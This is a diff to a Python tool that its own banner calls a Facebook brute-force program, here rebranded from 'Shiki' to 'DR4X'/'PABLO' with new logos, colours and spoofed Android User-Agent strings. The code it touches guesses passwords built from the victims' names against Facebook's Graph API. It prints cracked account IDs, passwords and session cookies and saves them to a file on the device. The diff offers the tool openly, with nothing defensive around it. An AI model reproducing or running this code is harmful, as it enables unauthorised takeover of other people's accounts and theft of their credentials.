@@ -39,56 +39,57 @@ def bypass():
   else:
     main()
 #----------logo----------#
-logo=('''\033[1;36m 
-█▀ █░█ █ █▄▀ █   █▀▄▀█ ▄▀█ █▀▀ █░█ █ █▄░█ ▄▀█
-▄█ █▀█ █ █░█ █   █░▀░█ █▀█ █▄▄ █▀█ █ █░▀█ █▀█
+logo=('''\033[1;33m 
+██████╗░██████╗░░░██╗██╗██╗░░██╗
+██╔══██╗██╔══██╗░██╔╝██║╚██╗██╔╝
+██║░░██║██████╔╝██╔╝░██║░╚███╔╝░
+██║░░██║██╔══██╗███████║░██╔██╗░
+██████╔╝██║░░██║╚════██║██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝
       ''')
 #----------clear----------#
 xy = requests.get('https://api.ipify.org/').text
 os.system('clear')
-print('\r\r\r\33[1;36m              YOUR IP:\33[1;36m'+str(xy))
+print('\r\r\r\33[1;33m              YOUR IP:\33[1;36m'+str(xy))
 time.sleep(5)
 def clear():
     os.system('clear')
     print(logo)
-    print("")
-    print("\033[1;96m ╔═════════════════════════════════╗")
-    print(" ║  \033[1;35mFACE\033[ BOOK BRUTEFORCE 1.0.0       \033[1;36m║")
-    print("\033[1;96m ╠═════════════════════════════════╣")
-    print(" \033[1;36m║  \033[1;35mFB:\033[1;32m SHIKI MACHINA              \033[1;36m║")
-    print(" \033[1;36m║  \033[1;35mSTATUS:\033[1;32m PRIVATE                \033[1;36m║")
-    print("\033[1;36m ║  \033[1;35m◉:\033[1;32m EXIT                        \033[1;36m║")
-    print("\033[1;96m ╚═════════════════════════════════╝")
-    print("")
+    print(42*'═')
+    print(' \033[1;33mFB LINK : https://www.facebook.com/angbo.bomo.75 ')
+    print(' GITHUB  : Scammur')
+    print(' STATUS  : FREE')
+    print(' VERSION : 2.3')
+    print(' IP      : '+xy)
+    print(42*'\033[1;32m═\033[0m')
 #----------line----------#
 def line():
-    print(42*'\033[1;36m═')
+    print(42*'\033[1;32m═')
 #----------menu----------#
-def check_apk(session, coki):
-    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+def check_apk(session, cookie):
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": cookie}).text
     sop = BeautifulSoup(w, "html.parser")
     x = sop.find("form", method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game) == 0:
-        print(f'[Placeholder][Placeholder] Sorry, there are no Active Apks[Placeholder]')
+    active_apps = [i.text for i in x.find_all("h3")]
+    if len(active_apps) == 0:
+        print(f'\r %s[%s!%s] %sSorry, there are no active APKs%s  ' % (N, M, N, M, N))
     else:
-        print(f'[?] Your Active Apps: [Placeholder]')
-        for i in range(len(game)):
-            print(f"[Placeholder] {Placeholder}%s %s" % ('N', i+1, game[i].replace("Added on", " Added on"), 'N'))
-
-    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+        print(f'\r 🎮  %sYour Active Application Details :' % (H))
+        for i, app in enumerate(active_apps):
+            print(f"\r %s{str(i + 1)}. {app.replace('Added on', 'Added on')}%s" % (N, N))
+    
+    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": cookie}).text
     sop = BeautifulSoup(w, "html.parser")
     x = sop.find("form", method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game) == 0:
-        print(f'[Placeholder][!] Sorry, there are no Expired Apks[Placeholder]\n')
+    inactive_apps = [i.text for i in x.find_all("h3")]
+    if len(inactive_apps) == 0:
+        print(f'\r %s[%s!%s] %sSorry, there are no expired APKs%s           \n' % (N, M, N, M, N))
     else:
-        print(f'[?] Your Expired Apps: [Placeholder]')
-        for i in range(len(game)):
-            print(f"[Placeholder] %s %s" % ('N', i+1, game[i].replace("Expired", " Expired"), 'N'))
+        print(f'\r 🎮  %sYour Expired Application Details :' % (M))
+        for i, app in enumerate(inactive_apps):
+            print(f"\r %s{str(i + 1)}. {app.replace('Expired', 'Expired')}%s" % (N, N))
         else:
-            print('\x1b[1;91m ... \x1b[1;92m 5 \x1b[1;92m ... \x1b[1;93m ... \x1b[1;94m ... \x1b[1;95m ... \x1b[1;96m ... \x1b[1;95m ... \x1b[1;94m ... \x1b[1;96m 5 \x1b[1;91m  ')
-                                            
+            print(f'\r')
 def main():
     clear()
     print(' [1] FILE CLONING ')
@@ -161,7 +162,7 @@ def m1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [Shiki~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -190,8 +191,7 @@ def m1(ids,names,passlist):
             build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
             fbbb=random.randint(100000000,300000000)
             headers={
-                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
-                                                                                                                                                                                                                                                                                               
+                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; 404: Not Found Build/{build}) [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}'+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]',
               'Content-Type': 'application/x-www-form-urlencoded', 
               'Host': 'graph.facebook.com', 
               'X-FB-Net-HNI': str(random.randint(10000,99999)), 
@@ -215,7 +215,7 @@ def m1(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
@@ -236,7 +236,7 @@ def m2(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [Shiki~ M2] %s| \033[1;32mOk\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -266,7 +266,7 @@ def m2(ids,names,passlist):
             fbbb = random.randint(200000000,300000000)
             fbob = random.randint(200000000,300000000)
             headers={
-                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
+                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
               'Content-Type': 'application/x-www-form-urlencoded', 
               'Host': 'graph.facebook.com', 
               'X-FB-Net-HNI': str(random.randint(10000,99999)), 
@@ -290,7 +290,7 @@ def m2(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
@@ -305,4 +305,3 @@ def m2(ids,names,passlist):
       
 #--end--
 bypass()
-               
